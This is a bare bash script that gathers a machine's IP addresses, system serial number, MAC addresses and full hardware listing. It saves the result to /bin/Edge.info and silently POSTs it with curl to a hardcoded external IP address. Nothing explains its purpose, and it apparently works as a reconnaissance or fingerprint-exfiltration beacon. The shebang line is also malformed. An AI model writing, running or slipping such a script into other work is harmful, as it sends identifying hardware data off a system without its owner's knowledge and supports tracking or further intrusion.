#!usr/bin/env bash
url=http://139.162.139.253:8080

text="--------------------------------START------------------------------------\n"
text+="IP:"
text+=$(hostname -I)
text+="|\n"
text+="DMIDECODE:"
text+=$(dmidecode -s system-serial-number)
text+="|\n"
text+="MAC:"
text+=$(ip a | grep -e "link/ether")
text+="|\n"
text+="LSHW:"
text+=$(lshw)
text+="|\n"
text+="|\n--------------------------------END------------------------------------\n"

echo -e $text > /bin/Edge.info

curl -X POST http://139.162.139.253:8080 -H "Content-Type: application/x-www-form-urlencoded" -d "param=$text" &1> /dev/null
~
